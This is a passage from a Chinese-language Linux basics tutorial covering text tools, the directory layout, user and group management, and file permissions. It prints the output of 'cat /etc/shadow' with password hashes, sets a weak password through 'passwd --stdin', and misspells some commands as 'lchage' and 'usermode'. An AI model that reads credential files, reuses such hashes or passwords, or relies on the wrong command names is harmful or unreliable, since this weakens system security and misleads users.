<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件头几行</span></span><br><span class="line">head</span><br><span class="line">例子1： head  test03.txt       #查看文件的前十行，默认</span><br><span class="line">例子2： head  -n 5 test03.txt  #查看文件的前5行</span><br><span class="line">例子3： head  -5  test03.txt   #查看文件的前5行</span><br></pre></td></tr></table></figure></div>

<p>命令12：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件倒数几行</span></span><br><span class="line">tail</span><br><span class="line">例子1： tail  test03.txt       #查看文件的倒数十行，默认</span><br><span class="line">例子2： tail  -n 5 test03.txt  #查看文件的倒数5行</span><br><span class="line">例子3： tail  -5  test03.txt   #查看文件的倒数5行</span><br></pre></td></tr></table></figure></div>

<p>管道</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:83:e4:d9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.128/24 brd 10.0.0.255 scope global noprefixroute dynamic ens33</span><br><span class="line">       valid_lft 1253sec preferred_lft 1253sec</span><br><span class="line">    inet6 fe80::ffe1:31ed:56dc:d9aa/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@localhost ~]# ip addr|tail -4</span><br><span class="line">    inet 10.0.0.128/24 brd 10.0.0.255 scope global noprefixroute dynamic ens33</span><br><span class="line">       valid_lft 1224sec preferred_lft 1224sec</span><br><span class="line">    inet6 fe80::ffe1:31ed:56dc:d9aa/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@localhost ~]# ip addr|tail -4|head -1</span><br><span class="line">    inet 10.0.0.128/24 brd 10.0.0.255 scope global noprefixroute dynamic ens33</span><br><span class="line">[root@localhost ~]# ip addr|tail -4|head -1|cut -c 10-19</span><br><span class="line">10.0.0.128</span><br></pre></td></tr></table></figure></div>

<h2 id="5-目录结构"><a href="#5-目录结构" class="headerlink" title="5.目录结构"></a>5.目录结构</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/bin      #存放二进制的可执行文件，命令，特别重要，不能删除!</span><br><span class="line">/boot     #开机启动需要的文件， 特别重要，不能删除!</span><br><span class="line">/dev      #device设备文件，特别重要，不能删除!</span><br><span class="line">/etc      #存放配置文件，特别重要，不能删除!</span><br><span class="line">/home     #普通用户的家目录</span><br><span class="line">/lib      #library 32位库，一般是so结尾，特别重要，不能删除!</span><br><span class="line">/lib64    #library 64位库，一般是so结尾，特别重要，不能删除!</span><br><span class="line">/media    #多媒体</span><br><span class="line">/mnt      #mount挂载光盘，U盘</span><br><span class="line">/opt      #部分软件安装存储目录</span><br><span class="line">/proc     #process进程 ， 特别重要，不能删除!</span><br><span class="line">/root     #root用户的家目录，特别重要，不能删除!</span><br><span class="line">/run      #运行，程序运行的时候产生的文件</span><br><span class="line">/sbin     #super bin超级用户才能使用的命令 ，特别重要，不能删除!</span><br><span class="line">/srv      #源代码</span><br><span class="line">/sys      #system系统目录 ，特别重要，不能删除!</span><br><span class="line">/tmp      #用来存放临时文件的目录</span><br><span class="line">/usr      #用户级的目录，特别重要，不能删除!</span><br><span class="line">/var      #variable 变化的文件，特别重要，不能删除!</span><br></pre></td></tr></table></figure></div>

<p>命令13</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">统计</span></span><br><span class="line">wc</span><br><span class="line">wc -l按行统计，不会单独使用，需要接在管道后面</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# cat test03.txt |wc -l</span><br><span class="line">18</span><br><span class="line">[root@localhost ~]# cat -n test03.txt </span><br><span class="line">     1	sdsdsdsdsdsdsd是的是的</span><br><span class="line">     2	</span><br><span class="line">     3	sdsd</span><br><span class="line">     4	65656</span><br><span class="line">     5	sdsd</span><br><span class="line">     6	sdsd</span><br><span class="line">     7	sdsd</span><br><span class="line">     8	33333</span><br><span class="line">     9	565656565</span><br><span class="line">    10	33333</span><br><span class="line">    11	565656565</span><br><span class="line">    12	33333</span><br><span class="line">    13	565656565</span><br><span class="line">    14	33333</span><br><span class="line">    15	565656565</span><br><span class="line">    16	</span><br><span class="line">    17	</span><br><span class="line">    18	sdssds  ;;;;</span><br></pre></td></tr></table></figure></div>

<p>命令14</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成数字序列</span></span><br><span class="line">seq</span><br><span class="line">例子1：产生一个5到12的序列</span><br><span class="line">[root@localhost ~]# seq 5 12</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line"></span><br><span class="line">例子2：产生一个5到12等宽的序列</span><br><span class="line">[root@localhost ~]# seq -w 5 12</span><br><span class="line">05</span><br><span class="line">06</span><br><span class="line">07</span><br><span class="line">08</span><br><span class="line">09</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td></tr></table></figure></div>

<p>命令15</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按行过滤字符串</span></span><br><span class="line">grep</span><br><span class="line">例子1： #普通过滤</span><br><span class="line">[root@localhost ~]# grep &#x27;3&#x27; test03.txt </span><br><span class="line">33333</span><br><span class="line">33333</span><br><span class="line">33333</span><br><span class="line">33333</span><br><span class="line">例子2： #显示行号</span><br><span class="line">[root@localhost ~]# grep -n &#x27;3&#x27; test03.txt </span><br><span class="line">8:33333</span><br><span class="line">10:33333</span><br><span class="line">12:33333</span><br><span class="line">14:33333</span><br></pre></td></tr></table></figure></div>

<p>grep精准匹配-w</p>
<p>命令16</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按列过滤</span></span><br><span class="line">awk</span><br><span class="line">例子1： 取列,$1代表第一列，$2代表第二列，$NF代表最后一列</span><br><span class="line">[root@localhost ~]# cat test01.txt </span><br><span class="line">row 1, cell 1	row 1, cell 2</span><br><span class="line">row 2, cell 1	row 2, cell 2</span><br><span class="line">[root@localhost ~]# awk &#x27;&#123;print $1&#125;&#x27; test01.txt </span><br><span class="line">row</span><br><span class="line">row</span><br><span class="line">[root@localhost ~]# awk &#x27;&#123;print $2&#125;&#x27; test01.txt </span><br><span class="line">1,</span><br><span class="line">2,</span><br><span class="line">例子2：以逗号,做分隔符</span><br><span class="line">[root@localhost ~]# cat test01.txt </span><br><span class="line">row 1, cell 1	row 1, cell 2</span><br><span class="line">row 2, cell 1	row 2, cell 2</span><br><span class="line">[root@localhost ~]# awk -F &#x27;,&#x27;   &#x27;&#123;print $1&#125;&#x27; test01.txt </span><br><span class="line">row 1</span><br><span class="line">row 2</span><br><span class="line">[root@localhost ~]# awk -F &#x27;,&#x27;   &#x27;&#123;print $NF&#125;&#x27; test01.txt </span><br><span class="line"> cell 2</span><br><span class="line"> cell 2</span><br></pre></td></tr></table></figure></div>

<p>命令17</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">排序</span></span><br><span class="line">sort</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# cat test02.txt</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">6</span><br><span class="line">4</span><br><span class="line">8</span><br><span class="line">7</span><br><span class="line">5</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">9</span><br><span class="line">1</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">[root@localhost ~]# cat test02.txt|sort -n</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td></tr></table></figure></div>

<p>命令18：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">统计去重</span></span><br><span class="line">uniq</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# cat test02.txt|sort -n</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">[root@localhost ~]# cat test02.txt|sort -n|uniq -c</span><br><span class="line">      2 1</span><br><span class="line">      3 2</span><br><span class="line">      3 3</span><br><span class="line">      2 4</span><br><span class="line">      3 5</span><br><span class="line">      2 6</span><br><span class="line">      2 7</span><br><span class="line">      1 8</span><br><span class="line">      1 9</span><br></pre></td></tr></table></figure></div>

<h2 id="6-用户和用户组管理"><a href="#6-用户和用户组管理" class="headerlink" title="6.用户和用户组管理"></a>6.用户和用户组管理</h2><p>命令19</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">作用查看所有用户最后的登录时间</span></span><br><span class="line">lastlog</span><br><span class="line">例子：</span><br><span class="line">[root@qstack ~]# lastlog </span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             pts/0    111.198.38.138   Mon Sep  6 11:17:25 +0800 2021</span><br><span class="line">bin                                        **Never logged in**</span><br><span class="line">daemon                                     **Never logged in**</span><br><span class="line">adm                                        **Never logged in**</span><br><span class="line">lp                                         **Never logged in**</span><br><span class="line">sync                                       **Never logged in**</span><br><span class="line">shutdown                                   **Never logged in**</span><br><span class="line">halt                                       **Never logged in**</span><br><span class="line">mail                                       **Never logged in**</span><br><span class="line">uucp                                       **Never logged in**</span><br><span class="line">operator                                   **Never logged in**</span><br><span class="line">games                                      **Never logged in**</span><br><span class="line">gopher                                     **Never logged in**</span><br></pre></td></tr></table></figure></div>

<p>命令20：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建用户</span></span><br><span class="line">useradd </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建一个用户</span></span><br><span class="line">例子1：useradd  test1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建用户，并给用户指定用户组</span></span><br><span class="line">例子2：</span><br><span class="line">[root@localhost tmp]# useradd  -g test1  test3</span><br><span class="line">[root@localhost tmp]# id test3</span><br><span class="line">uid=1002(test3) gid=1000(test1) 组=1000(test1)</span><br></pre></td></tr></table></figure></div>

<p>命令21：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置密码</span></span><br><span class="line">passwd</span><br><span class="line">例子1：passwd  test1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用root用户给普通用户修改密码</span></span><br><span class="line">[root@localhost ~]# passwd test1</span><br><span class="line">更改用户 test1 的密码 。</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码是一个回文</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：所有的身份验证令牌已经成功更新。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">普通用户自己修改密码</span></span><br><span class="line">[test1@localhost ~]$ passwd </span><br><span class="line">更改用户 test1 的密码 。</span><br><span class="line">为 test1 更改 STRESS 密码。</span><br><span class="line">（当前）UNIX 密码：</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码少于 8 个字符</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码少于 8 个字符</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码未通过字典检查 - 过于简单化/系统化</span><br><span class="line">passwd: 已经超出服务重试的最多次数</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">免交互修改密码</span></span><br><span class="line">echo 123456|passwd --stdin test1</span><br></pre></td></tr></table></figure></div>

<p>命令22：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查用户是否存在</span></span><br><span class="line">id</span><br><span class="line">例子1: </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用户存在，系统的返回结果</span></span><br><span class="line">[root@localhost ~]# id test1</span><br><span class="line">uid=1000(test1) gid=1000(test1) 组=1000(test1)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用户不存在，系统的返回结果</span></span><br><span class="line">[root@localhost ~]# id test2</span><br><span class="line">id: test2: no such user</span><br></pre></td></tr></table></figure></div>

<p>命令23：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除用户</span></span><br><span class="line">userdel</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">被删除的用户还在登录状态</span></span><br><span class="line">[root@localhost ~]# userdel test1</span><br><span class="line">userdel: user test1 is currently used by process 2356</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">被删除的用户，退出登录之后，可以正常删除</span></span><br><span class="line">[root@localhost ~]# userdel test1</span><br></pre></td></tr></table></figure></div>

<p>命令24：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改用户信息</span></span><br><span class="line">usermode</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">锁定用户</span></span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# usermod -L test1  -U 解锁</span><br><span class="line">[root@localhost ~]# lchage -l test1</span><br><span class="line">帐号被锁。</span><br><span class="line">至少:	0</span><br><span class="line">至多:	99999</span><br><span class="line">警告:	7</span><br><span class="line">不活跃：	从不</span><br><span class="line">最后一次改变：	2021年07月20日</span><br><span class="line">密码过期：	从不</span><br><span class="line">密码不活跃：	从不</span><br><span class="line">帐号过期：	从不</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">禁止用户登录</span></span><br><span class="line">[root@localhost ~]# usermod -s /sbin/nologin test2</span><br><span class="line">[root@localhost ~]# grep -w &#x27;test2&#x27; /etc/passwd</span><br><span class="line">test2:x:1001:1001::/home/test2:/sbin/nologin</span><br></pre></td></tr></table></figure></div>

<p>命令25：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看用户详细信息</span></span><br><span class="line">lchage</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# lchage -l test1</span><br><span class="line">帐号没被锁。</span><br><span class="line">至少:	0</span><br><span class="line">至多:	99999</span><br><span class="line">警告:	7</span><br><span class="line">不活跃：	从不</span><br><span class="line">最后一次改变：	2021年07月20日</span><br><span class="line">密码过期：	从不</span><br><span class="line">密码不活跃：	从不</span><br><span class="line">帐号过期：	从不</span><br></pre></td></tr></table></figure></div>

<p>所有的用户信息存储在&#x2F;etc&#x2F;passwd文件中</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:998:User for polkitd:/:/sbin/nologin</span><br><span class="line">tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin</span><br><span class="line">abrt:x:173:173::/etc/abrt:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">test1:x:1000:1000::/home/test1:/bin/bash</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">passwd文件解释</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">test1:x:1000:1000::/home/test1:/bin/bash</span><br><span class="line">test2:x:1001:1001::/home/test2:/sbin/nologin</span><br><span class="line">test3:x:1002:1000::/home/test3:/sbin/nologin</span><br><span class="line">haha:x:1004:1004:putong user:/home/haha:/bin/bash</span><br><span class="line">第一列：用户名</span><br><span class="line">第二列：x</span><br><span class="line">第三列：uid</span><br><span class="line">第四列：gid</span><br><span class="line">第五列：注释，备注，一般为空</span><br><span class="line">第六列：家目录的位置</span><br><span class="line">第七列：使用shell的名称，默认使用/bin/bash</span><br></pre></td></tr></table></figure></div>



<p>所有的用户密码信息存储&#x2F;etc&#x2F;shadow</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat /etc/shadow</span><br><span class="line">root:$6$QM3AHtFflOvGbCnt$2wTYZrnO8c66vycaxprE79G.I7hiy8EqXntG86FXxqlSawjtKoTjAnAa9xFA3ad1QpFskJRPt0QeDPBnZZAdx0::0:99999:7:::</span><br><span class="line">bin:*:18353:0:99999:7:::</span><br><span class="line">daemon:*:18353:0:99999:7:::</span><br><span class="line">adm:*:18353:0:99999:7:::</span><br><span class="line">lp:*:18353:0:99999:7:::</span><br><span class="line">sync:*:18353:0:99999:7:::</span><br><span class="line">shutdown:*:18353:0:99999:7:::</span><br><span class="line">halt:*:18353:0:99999:7:::</span><br><span class="line">mail:*:18353:0:99999:7:::</span><br><span class="line">operator:*:18353:0:99999:7:::</span><br><span class="line">games:*:18353:0:99999:7:::</span><br><span class="line">ftp:*:18353:0:99999:7:::</span><br><span class="line">nobody:*:18353:0:99999:7:::</span><br><span class="line">systemd-network:!!:18827::::::</span><br><span class="line">dbus:!!:18827::::::</span><br><span class="line">polkitd:!!:18827::::::</span><br><span class="line">tss:!!:18827::::::</span><br><span class="line">abrt:!!:18827::::::</span><br><span class="line">sshd:!!:18827::::::</span><br><span class="line">postfix:!!:18827::::::</span><br><span class="line">chrony:!!:18827::::::</span><br><span class="line">test1:$6$7PLnhlcr$4SCHINbWrameVSn6rxYgDOeUBwvYOHVbEOIudtNxWXIl5ULSt1Om8FvK6R3s9fI0qNef1vq8NhVMNJwudmfkM1:18828:0:99999:7:::</span><br></pre></td></tr></table></figure></div>

<p>用户组管理</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">增  groupadd</span><br><span class="line">删  groupdel</span><br><span class="line">改  groupmod </span><br><span class="line">查  看/etc/group</span><br></pre></td></tr></table></figure></div>

<p>命令26</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">增加一个用户组</span></span><br><span class="line">groupadd</span><br><span class="line">例子：</span><br><span class="line">groupadd test  #创建用户的时候可以制定组   useradd -g test test2</span><br></pre></td></tr></table></figure></div>

<p>命令27</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除一个用户组</span></span><br><span class="line">groupdel</span><br><span class="line">例子： groupdel test</span><br></pre></td></tr></table></figure></div>

<p>命令28</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改一个用户组</span></span><br><span class="line">groupmod</span><br><span class="line">例子1：groupmod -g 999 test #修改用户组的组id</span><br><span class="line">例子2：groupmod -n haha test #讲用户组test修改为新的组名haha</span><br></pre></td></tr></table></figure></div>



<h2 id="7-权限管理"><a href="#7-权限管理" class="headerlink" title="7.权限管理"></a>7.权限管理</h2><p>root用户权限最高</p>
<p>user普通用户</p>
<p>users用户组</p>
<p>文件权限</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">r 4 代表读权限 read</span><br><span class="line">w 2 代表写权限 write</span><br><span class="line">x 1 代表执行权限</span><br><span class="line">- 0 空权限位</span><br><span class="line"></span><br><span class="line">权限值表</span><br><span class="line">0 ---</span><br><span class="line">1 --x</span><br><span class="line">2 -w-</span><br><span class="line">3 -wx</span><br><span class="line">4 r--</span><br><span class="line">5 r-x</span><br><span class="line">6 rw-</span><br><span class="line">7 rwx</span><br><span class="line"></span><br><span class="line">rw-   r--    r-- </span><br><span class="line">user  group  other</span><br></pre></td></tr></table></figure></div>

<p>命令25</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">改变文件的权限</span></span><br><span class="line">chmod</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改权限之前</span></span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rw-rw----. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改权限</span></span><br><span class="line">[test1@localhost tmp]$ chmod u+x test1.txt </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改权限之后</span></span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rwxrw----. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line">同时修改多个权限</span><br><span class="line">[test1@localhost tmp]$ chmod u-x,g-x,o+x test1.txt </span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rw-rw---x. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line">[test1@localhost tmp]$ chmod 777 test1.txt </span><br><span class="line">[test1@localhost tmp]$ ls -l</span><br><span class="line">总用量 4</span><br><span class="line">-rwxrwxrwx. 1 test1 test1 8 7月  20 17:20 test1.txt</span><br></pre></td></tr></table></figure></div>

<p>命令26</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改文件的所属</span></span><br><span class="line">chown</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost tmp]# chown test2:test2 ls</span><br><span class="line">[root@localhost tmp]# ls -l</span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test1 test1     14 7月  20 17:38 test1.txt</span><br><span class="line">[root@localhost tmp]# chown test1 ls</span><br><span class="line">[root@localhost tmp]# ls -l</span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test1 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test1 test1     14 7月  20 17:38 test1.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用uid和gid修改文件的所属用户和所属用户组  属主，属组</span></span><br><span class="line">例子2：</span><br><span class="line">[root@localhost tmp]# ls -l</span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test1 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test1 test1     14 7月  20 17:38 test1.txt</span><br><span class="line">[root@localhost tmp]# id test1</span><br><span class="line">uid=1000(test1) gid=1000(test1) 组=1000(test1)</span><br><span class="line">[root@localhost tmp]# id test2</span><br><span class="line">uid=1001(test2) gid=1001(test2) 组=1001(test2)</span><br><span class="line">[root@localhost tmp]# useradd  -g test1  test3</span><br><span class="line">[root@localhost tmp]# id test3</span><br><span class="line">uid=1002(test3) gid=1000(test1) 组=1000(test1)</span><br><span class="line">[root@localhost tmp]# chown 1001:1001 test1.txt </span><br><span class="line">[root@localhost tmp]# ls -l </span><br><span class="line">总用量 404</span><br><span class="line">-rwxr-xr-x. 1 test2 test2 159024 7月  20 17:43 grep</span><br><span class="line">-rwxr-xr-x. 1 test1 test2 117608 7月  20 17:38 ls</span><br><span class="line">-rwxr-xr-x. 1 test1 test1 130360 7月  20 17:43 mv</span><br><span class="line">-rw-rw-rw-. 1 test2 test2     14 7月  20 17:38 test1.txt</span><br></pre></td></tr></table></figure></div>

<p>文件属性</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件属性</span></span><br><span class="line">[root@localhost ~]# ls -l /tmp/123.txt</span><br><span class="line">-rw-r--r--. 1 root root 0 7月  20 23:17 /tmp/123.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段的第一个字符，表示文件类型 -文件 d目录 l软链接 b块设备</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段第2-4字符，表示该文件所属用户的权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段第5-7字符，表示该文件所属用户组的权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段第8-10字符，表示其他用户对该文件的权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一段的第11个字符，表示开启selinux的状态下创建的</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二段的数字，表示该文件的硬链接数量</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第三段的字符串，表示该文件所属用户</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第四段的字符串，表示该文件所属用户组</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第五段的数字，表示该文件的大小</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第六段到倒数第二段，都是该文件的修改时间</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最一段，该文件的名称</span></span><br></pre></td></tr></table></figure></div>

<p>linux一切皆文件的系统</p>
